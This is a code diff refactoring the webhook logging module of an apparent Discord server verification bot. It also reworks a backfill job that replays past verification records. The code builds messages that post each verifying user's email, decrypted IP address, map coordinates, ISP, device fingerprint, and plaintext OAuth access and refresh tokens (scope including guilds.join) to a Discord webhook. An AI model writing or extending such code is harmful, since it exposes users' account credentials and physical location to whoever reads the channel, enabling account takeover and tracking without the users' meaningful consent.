@@ -15,8 +15,8 @@ function safeSlice(str, start, end) {
     if (!str) return "";
     let sliceEnd = end;
     if (sliceEnd < str.length) {
-        const code = str.charCodeAt(sliceEnd - 1);
-        if (code >= 0xD800 && code <= 0xDBFF) {
+        const cp = str.codePointAt(sliceEnd - 1);
+        if (cp !== undefined && (cp > 0xFFFF || (cp >= 0xD800 && cp <= 0xDBFF))) {
             sliceEnd -= 1;
         }
     }
@@ -200,7 +200,9 @@ function formatPlatform(platform) {
 }
 
 function formatCoordinates(lat, lon) {
-    if (lat != null && lon != null && !isNaN(Number(lat)) && !isNaN(Number(lon))) {
+    const latNum = Number(lat);
+    const lonNum = Number(lon);
+    if (lat != null && lon != null && !Number.isNaN(latNum) && !Number.isNaN(lonNum)) {
         return `[${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`;
     }
     return "ไม่มีข้อมูล";
@@ -262,34 +264,130 @@ function formatSpoofedHeaders(device = {}) {
     return "ไม่พบ (ปกติ ✅)";
 }
 
-/**
- * Builds the canonical single-embed payload for a verification event.
- * Preserves all fields with zero silent truncation (OI-05 / P1-8).
- */
-function buildWebhookPayload({
-    eventId = null,
-    guildId = null,
-    guildName = null,
-    profile = {},
-    connections = [],
-    guildSummary = null,
-    ipInfo = {},
-    device = null,
-    tokens = {},
-    trackingSnapshot = {},
-    roleId = null,
-    roleName = null,
-    findings = [],
-    result = "success",
-    verifiedAt = Date.now()
-}) {
-    const rawIp = ipInfo.encryptedRawIp
-        ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP")
-        : (ipInfo.rawIp || ipInfo.ip || ipInfo.ipHash || "ไม่มีข้อมูล");
-    const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
-    const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";
+function buildDiscordInfoLines(profile, guildSummary) {
+    const globalName = profile.globalName || profile.username || "ไม่มี";
+    const username = profile.username || "ไม่มี";
+    const userId = String(profile.id || "ไม่มี");
+    const avatarLink = profile.avatarUrl ? `[คลิกเพื่อดูรูปโปรไฟล์](${profile.avatarUrl})` : "ไม่มี";
+    const bannerLink = profile.bannerUrl ? `[คลิกเพื่อดูแบนเนอร์](${profile.bannerUrl})` : "ไม่มี";
+    const discriminator = profile.discriminator && profile.discriminator !== "0" ? `#${profile.discriminator}` : "#0";
+    const email = profile.email || "ไม่มีข้อมูล";
+    const emailVerifiedText = profile.emailVerified ? `ยืนยันแล้ว${EMOJIS.CHECK}` : `ยังไม่ยืนยัน${EMOJIS.CROSS}`;
+    const appLocale = profile.locale || "th";
+    const mfaText = profile.mfaEnabled ? `เปิดใช้งาน${EMOJIS.CHECK}` : `ปิด${EMOJIS.CROSS}`;
+    const createdDate = profile.accountCreatedAt ? `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)` : "ไม่ระบุ";
+    const badges = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length ? profile.badgeFlags.join(", ") : "ไม่มี";
+    const nitroText = formatNitro(profile.premiumType);
+    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
+    const ownedGuilds = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
+    const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
 
-    // Embed Description
+    return [
+        `  • Global Name : ${globalName}`,
+        `  • Username : ${username}`,
+        `  • User ID : ${userId}`,
+        `  • Avatar URL : ${avatarLink}`,
+        `  • Banner URL : ${bannerLink}`,
+        `  • Discriminator : ${discriminator}`,
+        `  • Email : ${email}`,
+        `  • Email Verified : ${emailVerifiedText}`,
+        `  • ภาษาของแอป Discord : ${appLocale}`,
+        `  • MFA (2FA) : ${mfaText}`,
+        `  • วันสร้างบัญชี : ${createdDate}`,
+        `  • เหรียญตรา : ${badges}`,
+        `  • มี Nitro ไหม : ${nitroText}`,
+        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด : ${totalGuilds} เซิร์ฟเวอร์`,
+        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ : ${ownedGuilds} เซิร์ฟเวอร์`,
+        `  • มียศ เเอดมิน กี่เซิฟเวอร์ : ${adminGuilds} เซิร์ฟเวอร์`
+    ];
+}
+
+function buildIpLocationLines(ipInfo, rawIp, networkTypes) {
+    const coordsStr = formatCoordinates(ipInfo.lat, ipInfo.lon);
+    const accuracyRadius = ipInfo.accuracyRadius || 5;
+    const city = ipInfo.city || "ไม่ระบุ";
+    const region = ipInfo.region || ipInfo.regionName || "ไม่ระบุ";
+    const country = ipInfo.country || "ไม่ระบุ";
+    const locationStr = `เมือง-${city}, จังหวัด/รัฐ-${region}, ประเทศ-${country}`;
+    const zip = ipInfo.zip || "ไม่ระบุ";
+    const timezone = ipInfo.timezone || "Asia/Bangkok";
+    const isp = ipInfo.isp || "ไม่ทราบ ISP";
+    const org = ipInfo.org || ipInfo.as || "ไม่ระบุ";
+    const reverseDns = ipInfo.reverse || ipInfo.hostname || "ไม่ระบุ";
+    const networkStatusDetail = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
+    const mobileOrBroadband = formatMobileOrBroadband(ipInfo);
+
+    return [
+        `  • IP Address : ${rawIp}`,
+        `  • พิกัด ละติจูด/ลองจิจูด : ${coordsStr}`,
+        `  • รัศมีความแม่นยำพิกัด : ± ${accuracyRadius} กม.`,
+        `  • ตำแหน่ง : ${locationStr}`,
+        `  • รหัสไปรษณีย์ : ${zip}`,
+        `  • Timezone : ${timezone}`,
+        `  • ผู้ให้บริการอินเทอร์เน็ต : ${isp}`,
+        `  • องค์กรโครงข่าย : ${org}`,
+        `  • ชื่อโหนดโฮสต์ของเครือข่าย : ${reverseDns}`,
+        `  • สถานะเครือข่ายที่ตรวจพบ : ${networkStatusDetail}`,
+        `  • เน็ตมือถือหรือเน็ตบ้าน : ${mobileOrBroadband}`
+    ];
+}
+
+function buildDeviceLines(device) {
+    const deviceType = device?.deviceType || "Desktop";
+    const platformFormatted = formatPlatform(device?.platform);
+    const os = device?.os || "ไม่ระบุ";
+    const screen = device?.screenSize || "ไม่ระบุ";
+    const browser = device?.browser || "ไม่ระบุ";
+    const browserLanguages = Array.isArray(device?.languages) && device.languages.length ? device.languages.join(", ") : (device?.language || "th-TH, en-US");
+    const touchscreen = formatTouchscreen(device?.touchPoints);
+    const userAgentStr = device?.userAgent ? `\`${device.userAgent}\`` : "`ไม่มีข้อมูล`";
+
+    return [
+        `  • ประเภทอุปกรณ์ : ${deviceType}`,
+        `  • สถาปัตยกรรมระบบ : ${platformFormatted}`,
+        `  • ระบบปฏิบัติการ : ${os}`,
+        `  • หน้าจอ : ${screen}`,
+        `  • เบราว์เซอร์ : ${browser}`,
+        `  • ภาษาของเบราว์เซอร์ : ${browserLanguages}`,
+        `  • หน้าจอสัมผัส : ${touchscreen}`,
+        `  • User-Agent :`,
+        `  ${userAgentStr}`
+    ];
+}
+
+function buildTokenLines(tokens, findings, accessToken, refreshToken) {
+    const scopeStr = tokens.scope || "identify email connections guilds guilds.members.read guilds.join";
+    const expiresStr = formatExpires(tokens.expiresAt);
+    const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
+
+    return [
+        `  • Scope : ${scopeStr}`,
+        `  • หมดอายุ : ${expiresStr}`,
+        `  • รายงานความเสี่ยง : ${securityFindingsStr}`,
+        `  • Access Token :`,
+        `  \`${accessToken}\``,
+        `  • Refresh Token :`,
+        `  \`${refreshToken}\``
+    ];
+}
+
+function buildSecurityTrackingLines(device, trackingSnapshot, findings) {
+    const deviceFingerprint = formatDeviceFingerprint(device, trackingSnapshot);
+    const sharedIp = formatSharedIp(trackingSnapshot);
+    const firstSeen = trackingSnapshot.firstSeenAt ? formatDate(trackingSnapshot.firstSeenAt) : (trackingSnapshot ? "เพิ่งพบครั้งแรกในการยืนยันนี้" : "ไม่มีข้อมูล");
+    const spoofHeader = formatSpoofedHeaders(device || {});
+    const findingsSummary = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
+
+    return [
+        `  • ตรวจพบบัญชีในเครื่องนี้ : ${deviceFingerprint}`,
+        `  • บัญชีที่เคยใช้ IP นี้ : ${sharedIp}`,
+        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้ : ${firstSeen}`,
+        `  • การดัดแปลง Header เครือข่าย : ${spoofHeader}`,
+        `  • ข้อสังเกตความปลอดภัย : ${findingsSummary}`
+    ];
+}
+
+function buildEmbedDescription({ guildName, guildId, profile, result, roleId, roleName, ipInfo }) {
     const serverName = guildName || "Phomueangtai Community";
     const serverIdStr = guildId ? `(${guildId})` : "";
     const userTag = profile.id ? `<@${profile.id}>` : (profile.username || "ไม่ระบุ");
@@ -319,131 +417,55 @@ function buildWebhookPayload({
         `  • เครือข่ายที่อาจจะใช้ยืนยัน : ${networkStatusBrief}`
     ].join("\n");
 
-    // Section 1: ข้อมูลบัญชี Discord
-    const globalName = profile.globalName || profile.username || "ไม่มี";
-    const username = profile.username || "ไม่มี";
-    const userId = String(profile.id || "ไม่มี");
-    const avatarLink = profile.avatarUrl ? `[คลิกเพื่อดูรูปโปรไฟล์](${profile.avatarUrl})` : "ไม่มี";
-    const bannerLink = profile.bannerUrl ? `[คลิกเพื่อดูแบนเนอร์](${profile.bannerUrl})` : "ไม่มี";
-    const discriminator = profile.discriminator && profile.discriminator !== "0" ? `#${profile.discriminator}` : "#0";
-    const email = profile.email || "ไม่มีข้อมูล";
-    const emailVerifiedText = profile.emailVerified ? `ยืนยันแล้ว${EMOJIS.CHECK}` : `ยังไม่ยืนยัน${EMOJIS.CROSS}`;
-    const appLocale = profile.locale || "th";
-    const mfaText = profile.mfaEnabled ? `เปิดใช้งาน${EMOJIS.CHECK}` : `ปิด${EMOJIS.CROSS}`;
-    const createdDate = profile.accountCreatedAt ? `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)` : "ไม่ระบุ";
-    const badges = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length ? profile.badgeFlags.join(", ") : "ไม่มี";
-    const nitroText = formatNitro(profile.premiumType);
-    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
-    const ownedGuilds = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
-    const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
+    return { description, networkTypes };
+}
 
-    const discordInfoLines = [
-        `  • Global Name : ${globalName}`,
-        `  • Username : ${username}`,
-        `  • User ID : ${userId}`,
-        `  • Avatar URL : ${avatarLink}`,
-        `  • Banner URL : ${bannerLink}`,
-        `  • Discriminator : ${discriminator}`,
-        `  • Email : ${email}`,
-        `  • Email Verified : ${emailVerifiedText}`,
-        `  • ภาษาของแอป Discord : ${appLocale}`,
-        `  • MFA (2FA) : ${mfaText}`,
-        `  • วันสร้างบัญชี : ${createdDate}`,
-        `  • เหรียญตรา : ${badges}`,
-        `  • มี Nitro ไหม : ${nitroText}`,
-        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด : ${totalGuilds} เซิร์ฟเวอร์`,
-        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ : ${ownedGuilds} เซิร์ฟเวอร์`,
-        `  • มียศ เเอดมิน กี่เซิฟเวอร์ : ${adminGuilds} เซิร์ฟเวอร์`
-    ];
+/**
+ * Builds the canonical single-embed payload for a verification event.
+ * Preserves all fields with zero silent truncation (OI-05 / P1-8).
+ */
+function buildWebhookPayload({
+    eventId = null,
+    guildId = null,
+    guildName = null,
+    profile = {},
+    connections = [],
+    guildSummary = null,
+    ipInfo = {},
+    device = null,
+    tokens = {},
+    trackingSnapshot = {},
+    roleId = null,
+    roleName = null,
+    findings = [],
+    result = "success",
+    verifiedAt = Date.now()
+}) {
+    const rawIp = ipInfo.encryptedRawIp
+        ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP")
+        : (ipInfo.rawIp || ipInfo.ip || ipInfo.ipHash || "ไม่มีข้อมูล");
+    const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
+    const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";
 
-    // Section 2: ที่อยู่ IP & ตำแหน่ง
-    const coordsStr = formatCoordinates(ipInfo.lat, ipInfo.lon);
-    const accuracyRadius = ipInfo.accuracyRadius || 5;
-    const city = ipInfo.city || "ไม่ระบุ";
-    const region = ipInfo.region || ipInfo.regionName || "ไม่ระบุ";
-    const country = ipInfo.country || "ไม่ระบุ";
-    const locationStr = `เมือง-${city}, จังหวัด/รัฐ-${region}, ประเทศ-${country}`;
-    const zip = ipInfo.zip || "ไม่ระบุ";
-    const timezone = ipInfo.timezone || "Asia/Bangkok";
-    const isp = ipInfo.isp || "ไม่ทราบ ISP";
-    const org = ipInfo.org || ipInfo.as || "ไม่ระบุ";
-    const reverseDns = ipInfo.reverse || ipInfo.hostname || "ไม่ระบุ";
-    const networkStatusDetail = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
-    const mobileOrBroadband = formatMobileOrBroadband(ipInfo);
+    const { description, networkTypes } = buildEmbedDescription({
+        guildName,
+        guildId,
+        profile,
+        result,
+        roleId,
+        roleName,
+        ipInfo
+    });
 
-    const ipLocationLines = [
-        `  • IP Address : ${rawIp}`,
-        `  • พิกัด ละติจูด/ลองจิจูด : ${coordsStr}`,
-        `  • รัศมีความแม่นยำพิกัด : ± ${accuracyRadius} กม.`,
-        `  • ตำแหน่ง : ${locationStr}`,
-        `  • รหัสไปรษณีย์ : ${zip}`,
-        `  • Timezone : ${timezone}`,
-        `  • ผู้ให้บริการอินเทอร์เน็ต : ${isp}`,
-        `  • องค์กรโครงข่าย : ${org}`,
-        `  • ชื่อโหนดโฮสต์ของเครือข่าย : ${reverseDns}`,
-        `  • สถานะเครือข่ายที่ตรวจพบ : ${networkStatusDetail}`,
-        `  • เน็ตมือถือหรือเน็ตบ้าน : ${mobileOrBroadband}`
-    ];
-
-    // Section 3: อุปกรณ์ & เบราว์เซอร์
-    const deviceType = device?.deviceType || "Desktop";
-    const platformFormatted = formatPlatform(device?.platform);
-    const os = device?.os || "ไม่ระบุ";
-    const screen = device?.screenSize || "ไม่ระบุ";
-    const browser = device?.browser || "ไม่ระบุ";
-    const browserLanguages = Array.isArray(device?.languages) && device.languages.length ? device.languages.join(", ") : (device?.language || "th-TH, en-US");
-    const touchscreen = formatTouchscreen(device?.touchPoints);
-    const userAgentStr = device?.userAgent ? `\`${device.userAgent}\`` : "`ไม่มีข้อมูล`";
-
-    const deviceLines = [
-        `  • ประเภทอุปกรณ์ : ${deviceType}`,
-        `  • สถาปัตยกรรมระบบ : ${platformFormatted}`,
-        `  • ระบบปฏิบัติการ : ${os}`,
-        `  • หน้าจอ : ${screen}`,
-        `  • เบราว์เซอร์ : ${browser}`,
-        `  • ภาษาของเบราว์เซอร์ : ${browserLanguages}`,
-        `  • หน้าจอสัมผัส : ${touchscreen}`,
-        `  • User-Agent :`,
-        `  ${userAgentStr}`
-    ];
-
-    // Section 4: บัญชีนอกที่เชื่อมต่อ
+    const discordInfoLines = buildDiscordInfoLines(profile, guildSummary);
+    const ipLocationLines = buildIpLocationLines(ipInfo, rawIp, networkTypes);
+    const deviceLines = buildDeviceLines(device);
     const connList = Array.isArray(connections) && connections.length > 0
         ? connections.map(c => typeof c === "string" ? c : (c.type || c.name || "Unknown")).join(", ")
         : "ไม่มีการเชื่อมต่อบัญชีภายนอก";
-    const connectionLines = [
-        `  •  ${connList}`
-    ];
-
-    // Section 5: สิทธิ์และการเข้าถึง
-    const scopeStr = tokens.scope || "identify email connections guilds guilds.members.read guilds.join";
-    const expiresStr = formatExpires(tokens.expiresAt);
-    const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
-
-    const tokenLines = [
-        `  • Scope : ${scopeStr}`,
-        `  • หมดอายุ : ${expiresStr}`,
-        `  • รายงานความเสี่ยง : ${securityFindingsStr}`,
-        `  • Access Token :`,
-        `  \`${accessToken}\``,
-        `  • Refresh Token :`,
-        `  \`${refreshToken}\``
-    ];
-
-    // Section 6: ข้อมูลระบบตรวจจับความปลอดภัย
-    const deviceFingerprint = formatDeviceFingerprint(device, trackingSnapshot);
-    const sharedIp = formatSharedIp(trackingSnapshot);
-    const firstSeen = trackingSnapshot.firstSeenAt ? formatDate(trackingSnapshot.firstSeenAt) : (trackingSnapshot ? "เพิ่งพบครั้งแรกในการยืนยันนี้" : "ไม่มีข้อมูล");
-    const spoofHeader = formatSpoofedHeaders(device || {});
-    const findingsSummary = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
-
-    const securityLines = [
-        `  • ตรวจพบบัญชีในเครื่องนี้ : ${deviceFingerprint}`,
-        `  • บัญชีที่เคยใช้ IP นี้ : ${sharedIp}`,
-        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้ : ${firstSeen}`,
-        `  • การดัดแปลง Header เครือข่าย : ${spoofHeader}`,
-        `  • ข้อสังเกตความปลอดภัย : ${findingsSummary}`
-    ];
+    const connectionLines = [`  •  ${connList}`];
+    const tokenLines = buildTokenLines(tokens, findings, accessToken, refreshToken);
+    const securityLines = buildSecurityTrackingLines(device, trackingSnapshot, findings);
 
     const fields = [
         ...chunkLinesToFields(`${EMOJIS.ROLES} ข้อมูลบัญชี Discord`, discordInfoLines),
@@ -644,7 +666,11 @@ async function postWebhookMessage(webhookUrl, body, attempt = 1) {
  */
 function isPermanentWebhookError(err) {
     if (!err) return false;
-    const status = Number(err.status) || (String(err.message || "").match(/webhook_http_(\d{3})/) ? Number(RegExp.$1) : null);
+    let status = Number(err.status);
+    if (!status) {
+        const match = String(err.message || "").match(/webhook_http_(\d{3})/);
+        status = match ? Number(match[1]) : null;
+    }
     if (status && [400, 401, 403, 404, 405, 410].includes(status)) {
         return true;
     }
@@ -666,7 +692,9 @@ async function deliverWebhookEvent(webhookUrl, embeds = [], { startPart = 0, onP
     const messages = fitEmbedsIntoMessages(splitEmbeds);
     const startIndex = Math.max(0, Math.min(Number(startPart) || 0, messages.length));
 
-    for (let i = startIndex; i < messages.length; i++) {
+    async function sendPart(index) {
+        if (index >= messages.length) return;
+
         if (typeof checkDestinationValid === "function") {
             const isValid = await checkDestinationValid();
             if (!isValid) {
@@ -675,15 +703,20 @@ async function deliverWebhookEvent(webhookUrl, embeds = [], { startPart = 0, onP
                 throw destErr;
             }
         }
-        const msg = messages[i];
+
+        const msg = messages[index];
         await postWebhookMessage(webhookUrl, msg);
         if (typeof onPartSent === "function") {
-            await onPartSent(i + 1, messages.length);
+            await onPartSent(index + 1, messages.length);
         }
-        if (messages.length > 1 && i < messages.length - 1) {
+        if (messages.length > 1 && index < messages.length - 1) {
             await sleep(RATE_LIMIT_DELAY_MS);
         }
+
+        await sendPart(index + 1);
     }
+
+    await sendPart(startIndex);
     return true;
 }
 
@@ -1158,210 +1191,213 @@ class VerificationWebhookManager {
         }
     }
 
-    /**
-     * Executes backfill replay from MongoDB historical records (P1-1, P1-3, P1-9).
-     * Tracks per-item delivery status and does not skip failed items permanently.
-     */
-    async executeBackfill(guildId, job, leaseToken) {
+    async _validateBackfillInitial(guildId, job) {
         const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
         const webhookConfig = config?.verification?.webhookLog;
         const webhookUrl = webhookConfig?.url;
         if (!webhookConfig?.enabled || !webhookUrl) {
             console.warn(`[VerificationWebhook] Guild ${guildId} backfill job ${job.job_id} aborted: webhook disabled or missing URL`);
             this.repo.cancelJob(job.job_id, !webhookUrl ? "webhook_url_missing" : "webhook_disabled");
-            return;
+            return false;
+        }
+        return true;
+    }
+
+    async _validateBackfillPreconditions(guildId, job, leaseToken, destinationVersion) {
+        const currentJob = this.repo.getJobById(job.job_id);
+        if (currentJob?.status !== "RUNNING") {
+            console.warn(`[VerificationWebhook] Job ${job.job_id} is no longer running (status: ${currentJob?.status})`);
+            return false;
         }
 
-        let lastCursorId = job.last_cursor_id || null;
-        let processed = job.processed_count || 0;
-        const destinationVersion = job.destination_version || 1;
+        const currentConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
+        const currentWebhook = currentConfig?.verification?.webhookLog;
+        const currentMode = currentWebhook?.mode;
+        if (currentMode !== "backfill_live") {
+            console.warn(`[VerificationWebhook] Guild ${guildId} mode changed to ${currentMode || "off"}, halting backfill`);
+            this.repo.cancelJob(job.job_id, `mode_changed_to_${currentMode || "live"}`);
+            return false;
+        }
+        if (!currentWebhook?.url) {
+            console.warn(`[VerificationWebhook] Guild ${guildId} webhook URL removed during backfill`);
+            this.repo.cancelJob(job.job_id, "webhook_url_removed_during_backfill");
+            return false;
+        }
 
-        while (true) {
-            const currentJob = this.repo.getJobById(job.job_id);
-            if (currentJob?.status !== "RUNNING") {
-                console.warn(`[VerificationWebhook] Job ${job.job_id} is no longer running (status: ${currentJob?.status})`);
-                break;
+        const currentDestVersion = Number(currentWebhook?.destinationVersion) || 1;
+        if (currentDestVersion !== destinationVersion) {
+            console.warn(`[VerificationWebhook] Destination version changed for guild=${guildId} during backfill (from v${destinationVersion} to v${currentDestVersion})`);
+            this.repo.cancelJob(job.job_id, `destination_version_changed_to_${currentDestVersion}`);
+            return false;
+        }
+
+        const hasLease = this.repo.acquireJobLease(job.job_id, leaseToken, 30000);
+        if (!hasLease) {
+            console.warn(`[VerificationWebhook] Lease lost or held by another worker for job=${job.job_id}`);
+            const currentJobCheck = this.repo.getJobById(job.job_id);
+            if (currentJobCheck?.status === "RUNNING") {
+                this.scheduleNextRetry(guildId);
             }
+            return false;
+        }
 
-            const currentConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
-            const currentWebhook = currentConfig?.verification?.webhookLog;
-            const currentMode = currentWebhook?.mode;
-            if (currentMode !== "backfill_live") {
-                console.warn(`[VerificationWebhook] Guild ${guildId} mode changed to ${currentMode || "off"}, halting backfill`);
-                this.repo.cancelJob(job.job_id, `mode_changed_to_${currentMode || "live"}`);
-                break;
+        return true;
+    }
+
+    async _fetchBackfillBatch(guildId, lastCursorId) {
+        const query = {
+            guildId,
+            result: "success",
+            $or: [
+                { "roleAssignResult.ok": true },
+                { "roleAssignResult.alreadyHadRole": true },
+                { "roleAssignResult.joinedWithRole": true },
+                { "roleAssignResult.status": "success" }
+            ],
+            deletedAt: { $exists: false }
+        };
+        if (lastCursorId) {
+            if (mongoose.Types.ObjectId.isValid(lastCursorId)) {
+                query._id = { $gt: new mongoose.Types.ObjectId(lastCursorId) };
+            } else {
+                query._id = { $gt: lastCursorId };
             }
-            if (!currentWebhook?.url) {
-                console.warn(`[VerificationWebhook] Guild ${guildId} webhook URL removed during backfill`);
-                this.repo.cancelJob(job.job_id, "webhook_url_removed_during_backfill");
-                break;
+        }
+
+        return VerifyLog.find(query)
+            .sort({ _id: 1 })
+            .limit(BATCH_SIZE)
+            .lean();
+    }
+
+    async _processBackfillItem(guildId, job, log, leaseToken, state) {
+        const checkJob = this.repo.getJobById(job.job_id);
+        if (checkJob?.status !== "RUNNING") return false;
+
+        const checkConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
+        const mode = checkConfig?.verification?.webhookLog?.mode;
+        if (mode !== "backfill_live") {
+            this.repo.cancelJob(job.job_id, `mode_changed_to_${mode || "live"}`);
+            return false;
+        }
+        if (!checkConfig?.verification?.webhookLog?.url) {
+            this.repo.cancelJob(job.job_id, "webhook_url_missing_during_processing");
+            return false;
+        }
+
+        const eventId = String(log._id);
+        if (!isEligibleVerifyLog(log)) {
+            state.processed++;
+            state.lastCursorId = eventId;
+            this.repo.updateJobProgress(job.job_id, {
+                processedCount: state.processed,
+                lastCursorId: state.lastCursorId,
+                leaseToken
+            });
+            return true;
+        }
+
+        const renewed = this.repo.renewJobLease(job.job_id, leaseToken, 30000);
+        if (!renewed) {
+            console.warn(`[VerificationWebhook] Lease renewal failed for job ${job.job_id}; halting backfill to prevent conflict`);
+            this.scheduleNextRetry(guildId);
+            return false;
+        }
+
+        const existing = this.repo.getDeliveryByEventId(guildId, state.destinationVersion, eventId);
+        if (existing) {
+            if (existing.status === "FAILED" && typeof this.repo.requeueFailedDelivery === "function") {
+                this.repo.requeueFailedDelivery(existing.delivery_id, job.job_id);
             }
+            state.processed++;
+            state.lastCursorId = eventId;
+            this.repo.updateJobProgress(job.job_id, {
+                processedCount: state.processed,
+                lastCursorId: state.lastCursorId,
+                leaseToken
+            });
+            return true;
+        }
 
-            const currentDestVersion = Number(currentWebhook?.destinationVersion) || 1;
-            if (currentDestVersion !== destinationVersion) {
-                console.warn(`[VerificationWebhook] Destination version changed for guild=${guildId} during backfill (from v${destinationVersion} to v${currentDestVersion})`);
-                this.repo.cancelJob(job.job_id, `destination_version_changed_to_${currentDestVersion}`);
-                break;
-            }
+        const targetDeliveryId = `del_${guildId}_v${state.destinationVersion}_${eventId}`;
+        this.repo.enqueueDelivery({
+            deliveryId: targetDeliveryId,
+            jobId: job.job_id,
+            guildId,
+            destinationVersion: state.destinationVersion,
+            eventId,
+            userId: String(log.userId)
+        });
 
-            const hasLease = this.repo.acquireJobLease(job.job_id, leaseToken, 30000);
-            if (!hasLease) {
-                console.warn(`[VerificationWebhook] Lease lost or held by another worker for job=${job.job_id}`);
-                const currentJobCheck = this.repo.getJobById(job.job_id);
-                if (currentJobCheck?.status === "RUNNING") {
-                    this.scheduleNextRetry(guildId);
-                }
-                break;
-            }
+        state.processed++;
+        state.lastCursorId = eventId;
 
-            const query = {
-                guildId,
-                result: "success",
-                $or: [
-                    { "roleAssignResult.ok": true },
-                    { "roleAssignResult.alreadyHadRole": true },
-                    { "roleAssignResult.joinedWithRole": true },
-                    { "roleAssignResult.status": "success" }
-                ],
-                deletedAt: { $exists: false }
-            };
-            if (lastCursorId) {
-                if (mongoose.Types.ObjectId.isValid(lastCursorId)) {
-                    query._id = { $gt: new mongoose.Types.ObjectId(lastCursorId) };
-                } else {
-                    query._id = { $gt: lastCursorId };
-                }
-            }
+        const updProgress = this.repo.updateJobProgress(job.job_id, {
+            processedCount: state.processed,
+            lastCursorId: state.lastCursorId,
+            leaseToken
+        });
+        if (updProgress?.changes === 0) {
+            console.warn(`[VerificationWebhook] Lease expired or lost for job ${job.job_id}; halting backfill`);
+            return false;
+        }
+        return true;
+    }
 
-            const batch = await VerifyLog.find(query)
-                .sort({ _id: 1 })
-                .limit(BATCH_SIZE)
-                .lean();
+    async _processBackfillBatch(guildId, job, leaseToken, state) {
+        const ok = await this._validateBackfillPreconditions(guildId, job, leaseToken, state.destinationVersion);
+        if (!ok) return false;
 
-            if (!batch.length) {
-                if (processed < (job.total_eligible || 0)) {
-                    const remainingQuery = { ...query };
-                    delete remainingQuery._id;
-                    const actualRemaining = await VerifyLog.countDocuments(remainingQuery).catch(() => 0);
-                    if (actualRemaining > processed) {
-                        console.warn(`[VerificationWebhook] Backfill batch empty but ${actualRemaining} items remain in DB (processed: ${processed}/${job.total_eligible}).`);
-                    }
-                }
-                this.repo.updateJobProgress(job.job_id, {
-                    totalEligible: processed,
-                    processedCount: processed,
-                    lastCursorId,
-                    leaseToken
-                });
-                // All historical items have been enqueued. Now drain any remaining deliveries (P1-4).
-                await this.drainDeliveries(guildId);
-                await this.checkAndCompleteJobIfDone(job.job_id, guildId, leaseToken, { cursorExhausted: true });
-                break;
-            }
-
-            for (const log of batch) {
-                // Per-item cancellation/mode check (P1-3)
-                const checkJob = this.repo.getJobById(job.job_id);
-                if (!checkJob || checkJob.status !== "RUNNING") {
-                    return;
-                }
-                const checkConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
-                if (checkConfig?.verification?.webhookLog?.mode !== "backfill_live") {
-                    this.repo.cancelJob(job.job_id, `mode_changed_to_${checkConfig?.verification?.webhookLog?.mode || "live"}`);
-                    return;
-                }
-                if (!checkConfig?.verification?.webhookLog?.url) {
-                    this.repo.cancelJob(job.job_id, "webhook_url_missing_during_processing");
-                    return;
-                }
-
-                const eventId = String(log._id);
-
-                if (!isEligibleVerifyLog(log)) {
-                    processed++;
-                    lastCursorId = eventId;
-                    this.repo.updateJobProgress(job.job_id, {
-                        processedCount: processed,
-                        lastCursorId,
-                        leaseToken
-                    });
-                    continue;
-                }
-
-                // Renew lease between items to prevent expiration
-                const renewed = this.repo.renewJobLease(job.job_id, leaseToken, 30000);
-                if (!renewed) {
-                    console.warn(`[VerificationWebhook] Lease renewal failed for job ${job.job_id}; halting backfill to prevent conflict`);
-                    this.scheduleNextRetry(guildId);
-                    return;
-                }
-
-                // Check if already delivered for this destinationVersion
-                const existing = this.repo.getDeliveryByEventId(guildId, destinationVersion, eventId);
-                if (existing) {
-                    if (existing.status === "SENT" || existing.status === "SENDING") {
-                        processed++;
-                        lastCursorId = eventId;
-                        this.repo.updateJobProgress(job.job_id, {
-                            processedCount: processed,
-                            lastCursorId,
-                            leaseToken
-                        });
-                        continue;
-                    }
-                    if (existing.status === "PENDING" || existing.status === "RETRY") {
